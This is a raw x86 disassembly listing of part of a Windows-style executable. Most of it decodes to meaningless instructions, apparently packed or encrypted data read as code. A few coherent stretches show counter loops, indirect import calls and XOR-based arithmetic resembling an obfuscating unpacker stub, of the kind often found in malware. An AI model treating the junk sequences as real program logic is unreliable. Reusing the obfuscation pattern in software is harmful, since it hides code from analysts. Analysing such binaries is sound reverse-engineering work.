  40518e:	inc    ebx
  40518f:	dec    ebp
  405190:	dec    edi
  405191:	xchg   edx,eax
  405192:	jns    0x405155
  405194:	cwde   
  405195:	call   0x2fd0fd9
  40519a:	mov    WORD PTR [ebx+edx*2+0x32],ss
  40519e:	push   esp
  40519f:	outs   dx,BYTE PTR ds:[esi]
  4051a0:	cmp    BYTE PTR [esi-0x7d841975],dh
  4051a6:	out    dx,eax
  4051a7:	mov    ah,0x90
  4051a9:	sahf   
  4051aa:	push   edi
  4051ab:	sub    eax,0x9ccd95de
  4051b0:	jle    0x40519a
  4051b2:	stos   DWORD PTR es:[edi],eax
  4051b3:	xchg   edx,eax
  4051b4:	and    BYTE PTR [edx+0x5ec1439d],ah
  4051ba:	out    0xa9,al
  4051bc:	les    edi,FWORD PTR [edx]
  4051be:	cmp    al,0x22
  4051c0:	cmp    BYTE PTR [esi],bl
  4051c2:	neg    eax
  4051c4:	mov    WORD PTR [eax-0x4910220a],cs
  4051ca:	aas    
  4051cb:	mov    dh,ah
  4051cd:	nop
  4051ce:	xlat   BYTE PTR ds:[ebx]
  4051cf:	sub    BYTE PTR [eax-0x5ff8b60],ah
  4051d5:	aaa    
  4051d6:	cs lock mov esp,0x2f9abc9
  4051dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4051de:	test   BYTE PTR [edx-0x41],0x3d
  4051e2:	out    0xd4,eax
  4051e4:	jb     0x405206
  4051e6:	pop    ebx
  4051e7:	mov    edi,0x392e0e24
  4051ec:	in     eax,0x7f
  4051ee:	jp     0x40523a
  4051f0:	xor    ebx,DWORD PTR [esi+0x6d]
  4051f3:	sub    ch,dl
  4051f5:	and    DWORD PTR ds:0xf3a17f4e,eax
  4051fb:	ins    BYTE PTR es:[edi],dx
  4051fc:	ret    
  4051fd:	fwait
  4051fe:	dec    esi
  4051ff:	mov    es,WORD PTR [eax]
  405201:	ret    
  405202:	sbb    bh,ch
  405204:	dec    ebx
  405205:	mov    dl,0x27
  405207:	cs jb  0x405276
  40520a:	stos   BYTE PTR es:[edi],al
  40520b:	inc    ebp
  40520c:	(bad)  [ebx]
  40520e:	xchg   edx,eax
  40520f:	or     DWORD PTR [ebp+0x52384d86],edi
  405215:	ja     0x405240
  405217:	inc    ecx
  405218:	jns    0x4051a8
  40521a:	jns    0x4051c1
  40521c:	and    eax,0x80611bcd
  405221:	mov    ch,0xc6
  405223:	mov    ebp,0xe6d70f8a
  405228:	jb     0x4051f8
  40522a:	shl    BYTE PTR [edx-0x46bd3f9b],cl
  405230:	sub    eax,0x4eac8bc3
  405235:	fs out 0x6c,eax
  405238:	dec    edx
  405239:	mov    esp,0x51402459
  40523e:	sbb    BYTE PTR [edx-0x7f8e0091],cl
  405244:	jns    0x4052ae
  405246:	jb     0x40524b
  405248:	and    eax,0x6f832853
  40524d:	call   0x8764:0xa3c3acb5
  405254:	pop    ebp
  405255:	push   ds
  405256:	popf   
  405257:	out    dx,eax
  405258:	adc    eax,0xad1f28fd
  40525d:	bound  esi,QWORD PTR [esi]
  40525f:	out    0x2d,al
  405261:	(bad)  
  405263:	retf   0xa565
  405266:	fdivr  QWORD PTR [edi-0x5bd5cf64]
  40526c:	fcom   QWORD PTR [ebx+eax*4-0x14754daf]
  405273:	add    dl,BYTE PTR [ecx]
  405275:	mov    esi,0xc5cebd79
  40527a:	add    ch,dh
  40527c:	aad    0xee
  40527e:	je     0x405276
  405280:	dec    esi
  405281:	lods   eax,DWORD PTR ds:[esi]
  405282:	je     0x4052a9
  405284:	jb     0x405223
  405286:	sub    bh,BYTE PTR [ebx-0xf]
  405289:	shl    DWORD PTR ds:0xb52597e0,0x25
  405290:	daa    
  405291:	call   0xcf327ee4
  405296:	es xchg ecx,eax
  405298:	mov    eax,ds:0xc851907a
  40529d:	iret   
  40529e:	call   0xbb88:0xe9b185
  4052a5:	mov    esi,0x8bd7af0f
  4052aa:	jge    0x405294
  4052ac:	xor    edi,eax
  4052ae:	add    edx,edi
  4052b0:	mov    edi,DWORD PTR [ebp-0x8]
  4052b3:	lea    edx,[edx+edi*1+0x32729d]
  4052ba:	mov    DWORD PTR [ebp-0x8],edx
  4052bd:	mov    edx,DWORD PTR [ebp-0x20]
  4052c0:	xor    edx,eax
  4052c2:	mov    edi,0xffcd8d63
  4052c7:	sub    edi,edx
  4052c9:	add    edi,DWORD PTR [ebp-0x10]
  4052cc:	mov    edx,DWORD PTR [ebp-0x20]
  4052cf:	mov    ebx,DWORD PTR [ebp-0x8]
  4052d2:	xor    edx,eax
  4052d4:	add    edx,ecx
  4052d6:	imul   edx,ebx
  4052d9:	cmp    edx,edi
  4052db:	jbe    0x403ae8
  4052e1:	pop    ebx
  4052e2:	pop    edi
  4052e3:	leave  
  4052e4:	ret    0x8
  4052e7:	push   ebp
  4052e8:	mov    ebp,esp
  4052ea:	push   ecx
  4052eb:	and    DWORD PTR ds:0x4304a6,0x0
  4052f5:	jmp    0x405305
  4052fa:	mov    eax,ds:0x4304a6
  4052ff:	inc    eax
  405300:	mov    ds:0x4304a6,eax
  405305:	cmp    DWORD PTR ds:0x4304a6,0x18
  40530c:	jae    0x40536e
  405312:	cmp    DWORD PTR ds:0x4304a6,0x4
  405319:	jne    0x40533f
  40531f:	push   0x7989
  405324:	push   0x6fea
  405329:	push   DWORD PTR [ebp-0x28]
  40532c:	push   0x5a2e
  405331:	push   DWORD PTR [ebp-0x24]
  405334:	push   0x2930
  405339:	call   DWORD PTR ds:0x42eaa8
  40533f:	cmp    DWORD PTR ds:0x4304a6,0x3
  405346:	jne    0x405357
  40534c:	mov    eax,ds:0x4304a6
  405351:	inc    eax
  405352:	mov    ds:0x4304a6,eax
  405357:	jmp    0x4052fa
  40535c:	mov    eax,ds:0x4304da
  405361:	xor    edx,edx
  405363:	add    edx,DWORD PTR ds:0x43056a
  405369:	sub    eax,edx
  40536b:	or     eax,DWORD PTR [eax+edx*1]
  40536e:	push   ecx
  40536f:	or     eax,DWORD PTR ds:0x4304c2
  405375:	mov    eax,0xf89c8535
  40537a:	sbb    DWORD PTR ds:0x4304b2,ecx
  405380:	mov    DWORD PTR [ebp-0x8],eax
  405383:	movzx  ecx,BYTE PTR ds:0x4304a6
  40538a:	add    DWORD PTR ds:0x42e772,ecx
  405390:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  405397:	and    DWORD PTR ds:0x4304be,0x0
  4053a1:	mov    ecx,DWORD PTR ds:0x4304be
  4053a7:	inc    ecx
  4053a8:	mov    DWORD PTR ds:0x4304be,ecx
  4053ae:	cmp    DWORD PTR ds:0x4304be,0x22
  4053b5:	jne    0x4053c9
  4053bb:	push   DWORD PTR [ebp-0x24]
  4053be:	push   0x8601
  4053c3:	call   DWORD PTR ds:0x42eba0
  4053c9:	cmp    DWORD PTR ds:0x4304be,0x12
  4053d0:	jb     0x4053a1
  4053d6:	and    DWORD PTR ds:0x42ee14,0x0
  4053e0:	mov    ecx,DWORD PTR ds:0x42ee14
  4053e6:	inc    ecx
  4053e7:	mov    DWORD PTR ds:0x42ee14,ecx
  4053ed:	cmp    DWORD PTR ds:0x42ee14,0x7
  4053f4:	jne    0x405405
  4053fa:	push   0x68cd
  4053ff:	call   DWORD PTR ds:0x42e9e4
  405405:	cmp    DWORD PTR ds:0x42ee14,0x6
  40540c:	jne    0x40541f
  405412:	mov    ecx,DWORD PTR ds:0x42ee14
  405418:	inc    ecx
  405419:	mov    DWORD PTR ds:0x42ee14,ecx
  40541f:	cmp    DWORD PTR ds:0x42ee14,0x1d
  405426:	jb     0x4053e0
  40542c:	mov    edx,DWORD PTR [ebp-0x8]
  40542f:	push   esi
  405430:	mov    ecx,0x7510856
  405435:	xor    edx,ecx
  405437:	mov    esi,0x32729d
  40543c:	push   edi
  40543d:	mov    edi,DWORD PTR [ebp+0x10]
  405440:	add    edx,esi
  405442:	jmp    0x40581e
  405447:	sub    dl,BYTE PTR [edi+0x7c7d3afd]
  40544d:	in     eax,dx
  40544e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40544f:	ins    DWORD PTR es:[edi],dx
  405450:	ret    
  405451:	mov    ecx,0x97bf9d09
  405456:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405457:	shl    BYTE PTR [esi+edi*2],cl
  40545a:	jle    0x405419
  40545c:	jno    0x4054dc
  40545e:	jle    0x405402
  405460:	jge    0x4053fe
  405462:	or     ebp,DWORD PTR ss:[ebx+0xe9f33eb]
  405469:	dec    ebx
  40546a:	push   cs
  40546b:	dec    edx
  40546c:	add    BYTE PTR [edi],ah
  40546e:	pop    eax
  40546f:	adc    bl,BYTE PTR [edx]
  405471:	mov    eax,es:0x6419ae72
  405477:	pop    esi
  405478:	jns    0x40543f
  40547a:	enter  0xeb47,0xba
  40547e:	add    eax,0x5dcc9d25
  405483:	bound  edx,QWORD PTR [edx+ebp*1+0x7fd5282b]
  40548a:	lods   eax,DWORD PTR ds:[esi]
  40548b:	xor    esp,DWORD PTR [eax]
  40548d:	push   ecx
  40548e:	test   al,0x84
  405490:	shl    DWORD PTR [edx-0xec97396],0x48
  405497:	dec    ecx
  405498:	mov    ah,0xd4
  40549a:	fld    QWORD PTR [esi-0x7f]
  40549d:	or     ah,BYTE PTR [edx-0x7d]
  4054a0:	push   esp
  4054a1:	cmp    DWORD PTR [esi],eax
  4054a3:	sbb    al,BYTE PTR [edi-0x1f]
  4054a6:	adc    al,0xf
  4054a8:	and    DWORD PTR [edx+0x2d8a2b12],ecx
  4054ae:	mov    esp,0xe8dcd693
  4054b3:	and    BYTE PTR [ebx],0xda
  4054b6:	in     eax,0xe8
  4054b8:	cld    
  4054b9:	adc    eax,0x1277afcb
  4054be:	mov    esi,0xd1675ac9
  4054c3:	stos   BYTE PTR es:[edi],al
  4054c4:	pop    ebx
  4054c5:	(bad)  [ebp+0x3f]
  4054c8:	in     al,0x54
  4054ca:	add    BYTE PTR [ebx-0x35939688],bl
  4054d0:	lds    edx,FWORD PTR [ecx]
  4054d2:	xchg   ebp,eax
  4054d3:	xchg   ecx,eax
  4054d4:	inc    eax
  4054d5:	mov    ebx,0xd796b5b4
  4054da:	mov    bl,0xbd
  4054dc:	cld    
  4054dd:	mov    edx,0xfa54ee2e
  4054e2:	add    BYTE PTR [ebx*8-0x5ff59f84],dh
  4054e9:	dec    ebp
  4054ea:	daa    
  4054eb:	mov    esi,0xf5ee6612
  4054f0:	pop    edx
  4054f1:	mov    ebx,DWORD PTR [edi]
  4054f3:	inc    eax
  4054f4:	(bad)  
  4054f6:	out    dx,eax
  4054f7:	ret    0xf75f
  4054fa:	mov    ds:0xf0747109,al
  4054ff:	test   al,0x46
  405501:	mov    dl,0xc3
  405503:	mov    ?,esp
  405505:	int    0x3d
  405507:	and    BYTE PTR [edx+0x4e0c2d9c],dh
  40550d:	outs   dx,DWORD PTR ds:[esi]
  40550e:	or     eax,ebp
  405510:	adc    bl,BYTE PTR [edi+0x1e]
  405513:	mov    ecx,0x3fa204b0
  405518:	push   edx
  405519:	dec    esp
  40551a:	dec    ebx
  40551b:	xchg   ecx,eax
  40551c:	outs   dx,BYTE PTR ds:[esi]
  40551d:	ss in  eax,0x83
  405520:	dec    eax
  405521:	add    DWORD PTR [esi-0x5e],0x516092ba
  405528:	div    DWORD PTR [bx]
  40552b:	test   esi,ecx
  40552d:	ret    
  40552e:	into   
  40552f:	push   edi
  405530:	inc    esi
  405531:	hlt    
  405532:	jbe    0x4055a7
  405534:	aad    0x2
  405536:	jge    0x40559c
  405538:	sub    al,0x75
  40553a:	push   esi
  40553b:	fdiv   DWORD PTR [ebx+edx*8+0x5]
  40553f:	inc    ecx
  405540:	lock dec ebx
  405542:	cmp    ebx,DWORD PTR [ebx]
  405544:	cmp    dh,BYTE PTR [ecx-0x6cc2e1b7]
  40554a:	in     eax,0x69
  40554c:	pop    ss
  40554d:	outs   dx,BYTE PTR ds:[esi]
  40554e:	jmp    0xa59767dc
  405553:	rcl    BYTE PTR [ecx+ecx*2+0x53],1
  405557:	or     al,BYTE PTR [ecx+0x1a7a4086]
  40555d:	hlt    
  40555e:	call   0x7d73:0x8df9a08b
  405565:	ins    BYTE PTR es:[edi],dx
  405566:	mov    esp,0xcb8a15b6
  40556b:	call   0xe999371a
  405570:	aas    
  405571:	fs inc edx
  405573:	mov    ebp,DWORD PTR [ebx-0x68]
  405576:	xchg   edx,eax
  405577:	fwait
  405578:	dec    ebp
  405579:	out    0xa6,al
  40557b:	popf   
  40557c:	and    cl,bh
  40557e:	adc    al,BYTE PTR [eax]
  405580:	sar    DWORD PTR es:[edi-0x5d],cl
  405584:	pusha  
  405585:	call   FWORD PTR [ebx]
  405587:	(bad)  
  405588:	jns    0x405587
  40558a:	(bad)  
  40558b:	xor    al,0xb5
  40558d:	push   eax
  40558e:	pop    ebx
  40558f:	retf   
  405590:	ffreep st(5)
  405592:	rcl    DWORD PTR [ebp+0x1bc19065],cl
  405598:	ss mov bl,0xd4
  40559b:	outs   dx,BYTE PTR ds:[esi]
  40559c:	sti    
  40559d:	lea    edi,[eax+eax*8-0x43]
  4055a1:	outs   dx,BYTE PTR ds:[esi]
  4055a2:	lock adc eax,0xc40f5a85
  4055a8:	sbb    esi,DWORD PTR ds:0x89c10836
  4055ae:	sub    DWORD PTR [ebx-0x7571b585],eax
  4055b4:	div    BYTE PTR [esi+ebp*2+0x60]
  4055b8:	adc    eax,0x37e2ba75
  4055bd:	jns    0x405615
  4055bf:	mov    ch,dl
  4055c1:	ins    BYTE PTR es:[edi],dx
  4055c2:	xor    eax,0x18d4c99d
  4055c7:	mov    cl,0xf1
  4055c9:	or     edi,DWORD PTR [edi+eax*1]
  4055cc:	cmp    eax,0xc4227595
  4055d1:	push   ecx
  4055d2:	ins    BYTE PTR es:[edi],dx
  4055d3:	nop
  4055d4:	rol    DWORD PTR [esi+0x7c],1
  4055d7:	pop    ss
  4055d8:	fisttp QWORD PTR [ecx]
  4055da:	cmp    bl,al
  4055dc:	in     al,0x9e
  4055de:	ja     0x405605
  4055e0:	out    0x9d,al
  4055e2:	cdq    
  4055e3:	jo     0x4055eb
  4055e5:	cmp    DWORD PTR [ecx],eax
  4055e7:	xor    BYTE PTR [ecx-0xe],cl
  4055ea:	mov    bl,0xfd
  4055ec:	jl     0x405666
  4055ee:	add    bl,0xa6
  4055f1:	cwde   
  4055f2:	pop    DWORD PTR [eax-0x44]
  4055f5:	lock inc edi
  4055f7:	loope  0x405579
  4055f9:	imul   esp,DWORD PTR [eax-0x4],0xdfd29508
  405600:	outs   dx,BYTE PTR ds:[esi]
  405601:	cmc    
  405602:	jmp    0x4055c8
  405604:	pop    ebx
  405605:	js     0x405662
  405607:	and    cl,BYTE PTR [ebp+0x72]
  40560a:	push   esi
  40560b:	(bad)  
  40560c:	add    bl,cl
  40560e:	(bad)  
  40560f:	fimul  WORD PTR [eax]
  405611:	call   0xae8cde18
  405616:	adc    eax,0x4f2c77e1
  40561b:	aam    0xb
  40561d:	inc    edx
  40561e:	dec    eax
  40561f:	aaa    
  405620:	sbb    eax,0xbba4d66c
  405625:	imul   al
  405627:	mov    al,BYTE PTR [ecx-0x72b5ed03]
  40562d:	and    BYTE PTR [esi],bl
  40562f:	pop    edi
  405630:	jb     0x4055db
  405632:	jl     0x40564b
  405634:	imul   esp,DWORD PTR [ebx+0x40bd131f],0xffffffa6
  40563b:	pop    edi
  40563c:	jbe    0x405622
  40563e:	in     al,dx
  40563f:	and    DWORD PTR [ecx],esi
  405641:	das    
  405642:	jle    0x405652
  405644:	ins    BYTE PTR es:[edi],dx
  405645:	jle    0x40560a
  405647:	lahf   
  405648:	mov    eax,ds:0x4582fe93
  40564d:	shl    BYTE PTR [edx+0x28],1
  405650:	fcmovnbe st,st(0)
  405652:	sti    
  405653:	popf   
  405654:	or     eax,0x752b5d10
  405659:	add    al,0xf6
  40565b:	jle    0x405668
  40565d:	repnz iret 
  40565f:	cmp    cl,BYTE PTR [edi+ebx*2-0x1c]
  405663:	mov    edi,0x708eb21f
  405668:	sub    esp,DWORD PTR [ecx]
  40566a:	jb     0x40567f
  40566c:	jnp    0x40560b
  40566e:	xor    DWORD PTR [eax-0x7abee318],0xc78a2613
  405678:	jns    0x405671
  40567a:	lahf   
  40567b:	pop    edi
  40567c:	mov    dl,0x86
  40567e:	or     al,dl
  405680:	mov    esi,0x52f97afa
  405685:	sub    DWORD PTR [ebp+0x9685a65],0x2
  40568c:	push   esi
  40568d:	xchg   ebp,eax
  40568e:	sti    
  40568f:	outs   dx,BYTE PTR ds:[esi]
  405690:	repnz sbb BYTE PTR [eax-0x160b08e9],cl
  405697:	dec    edx
  405698:	or     al,0x48
  40569a:	mov    esp,0xe53eb4e3
  40569f:	nop
  4056a0:	add    eax,0xc2f0a329
  4056a5:	inc    ecx
  4056a6:	mov    edi,0xb0be77e
  4056ab:	int3   
  4056ac:	adc    al,0x37
  4056ae:	dec    esi
  4056af:	or     cl,BYTE PTR [ebx+0x7798e0bc]
  4056b5:	sub    ch,0xd0
  4056b8:	jbe    0x40571a
  4056ba:	ins    BYTE PTR es:[edi],dx
  4056bb:	int    0x25
  4056bd:	pop    es
  4056be:	outs   dx,BYTE PTR ds:[esi]
  4056bf:	rol    DWORD PTR [ebp+0x12],1
  4056c2:	enter  0xe7dc,0x37
  4056c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4056c7:	divps  xmm3,XMMWORD PTR [ecx+0x27f1b9cf]
  4056ce:	mov    DWORD PTR [ebx],ebx
  4056d0:	shl    DWORD PTR [esi-0x47],cl
  4056d3:	mov    esp,edx
  4056d5:	cmp    DWORD PTR [edx],eax
  4056d7:	jge    0x40567a
  4056d9:	jno    0x40574f
  4056db:	dec    ecx
  4056dc:	mov    al,BYTE PTR [ebp+0x17f0a053]
  4056e2:	sbb    DWORD PTR [ebx],ebx
  4056e4:	cmp    DWORD PTR [ecx+0x7f83b70f],esi
  4056ea:	adc    ebp,DWORD PTR [edx+0x63]
  4056ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4056ee:	(bad)  
  4056f0:	lods   eax,DWORD PTR ds:[esi]
  4056f1:	stos   BYTE PTR es:[edi],al
  4056f2:	cmc    
  4056f3:	outs   dx,BYTE PTR ds:[esi]
  4056f4:	pop    es
  4056f5:	inc    edx
  4056f6:	call   0x82ed:0x549564c1
  4056fd:	stos   BYTE PTR es:[edi],al
  4056fe:	mov    ds,WORD PTR [eax-0x49]
  405701:	jmp    0xd87f4528
  405706:	jno    0x405693
  405708:	adc    ebp,DWORD PTR [eax]
  40570a:	scas   al,BYTE PTR es:[edi]
  40570b:	sub    eax,0x4ea59e83
  405710:	jmp    FWORD PTR [edx]
  405712:	scas   eax,DWORD PTR es:[edi]
  405713:	jg     0x405761
  405715:	lods   al,BYTE PTR ds:[esi]
  405716:	adc    ah,bh
  405718:	shl    DWORD PTR [eax+0x73],cl
  40571b:	or     DWORD PTR [esi-0x43ec5f85],eax
  405721:	or     al,0x75
  405723:	lods   eax,DWORD PTR ds:[esi]
  405724:	or     eax,edi
  405726:	(bad)  
  405727:	repnz sbb dl,cl
  40572a:	test   eax,0x6c1d575e
  40572f:	mov    ebx,esp
  405731:	or     dh,BYTE PTR [edx+0x27a25265]
  405737:	rcr    DWORD PTR [ebx+eax*1-0x70b303a2],0x7d
  40573f:	stc    
  405740:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405741:	and    al,0xd7
  405743:	cli    
  405744:	test   BYTE PTR [ecx-0x7eb93858],ah
  40574a:	mov    ebx,0xbc994314
  40574f:	jnp    0x405780
  405751:	and    esp,DWORD PTR [ebp+edi*8+0x169708c4]
  405758:	cli    
  405759:	fcmovnbe st,st(1)
  40575b:	jg     0x405717
  40575d:	out    dx,al
  40575e:	xchg   esp,eax
  40575f:	jmp    0x9b11:0xee8f41f3
  405766:	shr    DWORD PTR [ebp-0x7f7a2c86],1
  40576c:	and    ch,al
  40576e:	fwait
  40576f:	pxor   mm3,QWORD PTR [esi+ebp*8-0x50ce8638]
  405777:	pop    ecx
  405778:	mov    eax,0xc284c95c
  40577d:	nop
  40577e:	mov    WORD PTR [edx],es
  405780:	inc    ebx
  405781:	sahf   
  405782:	mov    WORD PTR [esi],fs
  405784:	clc    
  405785:	into   
  405786:	mov    ecx,0x3d1364cd
  40578b:	mov    al,0x66
  40578d:	jp     0x4057a7
  40578f:	jecxz  0x4057cd
  405791:	xor    BYTE PTR [edi+0x25],0xd8
  405795:	int3   
  405796:	pop    ecx
  405797:	pushf  
  405798:	test   BYTE PTR [edx+eax*8+0x1af296e3],bh
  40579f:	nop
  4057a0:	popa   
  4057a1:	(bad)  [edx-0x21]
  4057a4:	icebp  
  4057a5:	push   cs
  4057a6:	pop    edi
  4057a7:	add    DWORD PTR [ebp-0x466c711],ebx
  4057ad:	in     al,0x11
  4057af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4057b0:	retf   
  4057b1:	xchg   DWORD PTR [ebx],ebx
  4057b3:	jg     0x40576b
  4057b5:	mov    ah,0x2f
  4057b7:	dec    ebp
  4057b8:	js     0x4057ed
  4057ba:	loopne 0x405802
  4057bc:	(bad)  
  4057bd:	jmp    DWORD PTR [ecx]
  4057bf:	mov    esi,0x8c94794
  4057c4:	and    DWORD PTR [edi+edi*8-0x5fe7d807],ebp
  4057cb:	jns    0x40576f
  4057cd:	call   0x7330c1c1
  4057d2:	cmp    ebp,DWORD PTR [ebp-0x1ca84408]
  4057d8:	inc    ebx
  4057d9:	jp     0x405794
  4057db:	clc    
  4057dc:	add    dh,BYTE PTR [eax+edx*2+0x6f]
  4057e0:	(bad)  
  4057e2:	dec    edx
  4057e3:	sar    al,0xea
  4057e6:	sub    BYTE PTR [edi+ebp*1],dh
  4057e9:	adc    edi,DWORD PTR [edi+0x538793eb]
  4057ef:	mov    ecx,0x5ea321b7
  4057f4:	xchg   esp,eax
  4057f5:	in     eax,0xe0
  4057f7:	pop    ebp
  4057f8:	in     al,0x6
  4057fa:	xor    dh,dh
  4057fc:	jle    0x405820
  4057fe:	loope  0x4057db
  405800:	stos   DWORD PTR es:[edi],eax
  405801:	mov    cl,0xab
  405803:	mov    ah,0xff
  405805:	imul   eax,DWORD PTR [esi-0x241b2e0c],0xffffffa6
  40580c:	add    BYTE PTR [edi],bh
  40580e:	pop    ecx
  40580f:	sahf   
  405810:	shl    DWORD PTR [esi+0x7f],1
  405813:	cwde   
  405814:	out    dx,al
  405815:	das    
  405816:	ficom  WORD PTR [ebx]
  405818:	and    eax,0x7f04cad2
  40581d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40581e:	cmp    edi,edx
  405820:	je     0x40642d
  405826:	mov    edx,DWORD PTR [ebp-0x8]
  405829:	mov    eax,DWORD PTR [ebp-0x4]
  40582c:	xor    eax,ecx
  40582e:	mov    edi,0xffcd8d63
  405833:	jmp    0x405c0f
  405838:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405839:	loop   0x4058ae
  40583b:	fmul   DWORD PTR [ebx-0x7]
  40583e:	jge    0x4058a4
  405840:	xor    BYTE PTR [edx+ebx*8-0x304b7dc4],bh
  405847:	dec    ebx
  405848:	adc    DWORD PTR [eax],edi
  40584a:	jle    0x4058ca
  40584c:	mov    ebp,0xc67e7e71
  405851:	cmp    BYTE PTR [eax+0x7ad0864a],al
  405857:	fmul   QWORD PTR [ebp+0x7a]
  40585a:	jmp    0xbd6f4796
  40585f:	mov    ch,BYTE PTR [edi+0x4]
  405862:	inc    eax
  405863:	(bad)  
  405864:	or     ch,BYTE PTR [esp+esi*4+0x76]
  405868:	and    eax,0x7c9a1207
  40586d:	aad    0x88
  40586f:	jecxz  0x405835
  405871:	fbld   TBYTE PTR [esi]
  405873:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405874:	add    eax,0x6c81df8
  405879:	sets   al
  40587c:	into   
  40587d:	jg     0x4058c7
  40587f:	mov    esi,0x7744aaa0
  405884:	fild   DWORD PTR [edi]
  405886:	aad    0xcc
  405888:	inc    ecx
  405889:	sbb    eax,0x8106328c
  40588e:	push   ecx
  40588f:	sub    DWORD PTR [ecx+0x67d3924b],ebp
  405895:	cmp    al,0xb7
  405897:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405898:	xchg   DWORD PTR [esi],edi
  40589a:	mov    bl,0x41
  40589c:	call   0x39a6:0xa3befe3
  4058a3:	push   ebx
  4058a4:	out    dx,eax
  4058a5:	push   es
  4058a6:	cld    
  4058a7:	inc    esi
  4058a8:	daa    
  4058a9:	iret   
  4058aa:	dec    esp
  4058ab:	inc    ebp
  4058ac:	xchg   ebp,eax
  4058ad:	call   0x4e5:0x7ad942ad
  4058b4:	mov    edx,0xba016d16
  4058b9:	cmp    bl,BYTE PTR [ebx-0x7d94a053]
  4058bf:	(bad)  
  4058c0:	adc    esp,edx
  4058c2:	xchg   ecx,eax
  4058c3:	jg     0x405931
  4058c5:	add    bl,ch
  4058c7:	repnz imul esi,DWORD PTR [ebp-0x53199d5c],0x832e327
  4058d2:	mov    DWORD PTR [ebx+0x7e50a731],edi
  4058d8:	lea    esi,[esp+ebp*4-0x23]
  4058dc:	push   cs
  4058dd:	out    dx,al
  4058de:	mov    DWORD PTR [edi],esi
  4058e0:	sub    DWORD PTR [esi+0x7f],0xffffff92
  4058e4:	ror    BYTE PTR [esi],1
  4058e6:	sbb    esi,DWORD PTR [eax]
  4058e8:	jmp    FWORD PTR [edx+0x614bf518]
  4058ee:	mov    cl,0x4d
  4058f0:	inc    edi
  4058f1:	inc    esp
  4058f2:	mov    edx,0x73c7a530
  4058f7:	or     cl,BYTE PTR [esi]
  4058f9:	push   cs
  4058fa:	xor    esi,edx
  4058fc:	jp     0x405925
  4058fe:	jbe    0x4058b1
  405900:	test   DWORD PTR [eax+0x4e0de1d2],edi
  405906:	xor    ebx,DWORD PTR [edi]
  405908:	mov    al,0x14
  40590a:	loopne 0x405961
  40590c:	push   eax
  40590d:	or     al,0x8b
  40590f:	sub    eax,0xf43c0e31
  405914:	push   0x6c17b599
  405919:	sbb    bl,al
  40591b:	das    
  40591c:	fxtract 
  40591e:	inc    cx
  405920:	(bad)  
  405921:	push   esp
  405922:	mov    edx,0xdaaca6d2
  405927:	fldenv [ecx+0x20]
  40592a:	mov    WORD PTR [ebp+ecx*1+0x98807fd],gs
  405931:	jo     0x4058f2
  405933:	(bad)  
  405934:	push   ebp
  405935:	sub    dh,cl
  405937:	pop    edx
  405938:	scas   eax,DWORD PTR es:[edi]
  405939:	(bad)  
  40593a:	stc    
  40593b:	pop    esi
  40593c:	pop    esp
  40593d:	mov    ch,0x92
  40593f:	sbb    eax,0x65e652ca
  405944:	lods   al,BYTE PTR ds:[esi]
  405945:	enter  0xdcdc,0x12
  405949:	ret    0xc9b2
  40594c:	loope  0x40591e
  40594e:	pushf  
  40594f:	inc    ebx
  405950:	cmp    al,0x8d
  405952:	adc    dl,BYTE PTR [edx]
  405954:	cli    
  405955:	xchg   ebp,eax
  405956:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405957:	aaa    
  405958:	fs adc eax,0x115ef862
  40595e:	mov    DWORD PTR [edi+0x77],eax
  405961:	mov    ah,0xac
  405963:	dec    eax
  405964:	(bad)  
  405966:	dec    ebx
  405967:	call   0xa30d:0x4cbc21b5
  40596e:	mov    esp,0xeb2df4af
  405973:	xor    ch,ch
  405975:	jae    0x40591b
  405977:	imul   ebp,DWORD PTR [ebx-0x39],0xfa77abc2
  40597e:	ins    BYTE PTR es:[edi],dx
  40597f:	aad    0xc9
  405981:	pop    esp
  405982:	cwde   
  405983:	iret   
  405984:	or     edi,DWORD PTR [ecx]
  405986:	imul   ebp,DWORD PTR [ebx],0x9ab0a1e4
  40598c:	dec    ebx
  40598d:	ffree  st(0)
  40598f:	pop    edx
  405990:	dec    ecx
  405991:	mov    bl,0xb2
  405993:	fidivr DWORD PTR [edx+0x5]
  405996:	mov    edi,0x909aa3ad
  40599b:	or     DWORD PTR [ebx],ebp
  40599d:	inc    edi
  40599e:	stc    
  40599f:	cmc    
  4059a0:	push   ds
  4059a1:	nop
  4059a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4059a3:	xor    DWORD PTR ds:0xc834acb7,esi
  4059a9:	mov    BYTE PTR [edi],bh
  4059ab:	jbe    0x4059e2
  4059ad:	or     DWORD PTR [edi+0x4],ecx
  4059b0:	ins    DWORD PTR es:[edi],dx
  4059b1:	push   0xfffffff3
  4059b3:	add    ch,ah
  4059b5:	push   cs
  4059b6:	dec    edx
  4059b7:	popf   
  4059b8:	mov    bl,0xa
  4059ba:	adc    al,0x73
  4059bc:	xor    eax,0xf7d2d31f
  4059c1:	call   0xc5344962
  4059c6:	sub    eax,0xb1d9524f
  4059cb:	inc    edx
  4059cc:	jmp    0x4059fb
  4059ce:	mov    ch,0x22
  4059d0:	inc    esi
  4059d1:	movsx  edx,BYTE PTR [esi]
  4059d4:	test   eax,0xd8b75
  4059d9:	pushf  
  4059da:	jl     0x4059c1
  4059dc:	sbb    DWORD PTR [ebp+0x6de93074],esp
  4059e2:	sub    DWORD PTR gs:[esi-0x3a600f22],0x4505e30
  4059ed:	push   es
  4059ee:	outs   dx,DWORD PTR ds:[esi]
  4059ef:	xor    bl,dh
  4059f1:	popf   
  4059f2:	sbb    bl,BYTE PTR [edi-0x769b0caf]
  4059f8:	sar    esi,1
  4059fa:	dec    eax
  4059fb:	add    BYTE PTR [ebx-0x3b],ah
  4059fe:	cdq    
  4059ff:	pop    edi
  405a00:	ret    0xac2a
  405a03:	cmp    dl,BYTE PTR [esi-0x2077475d]
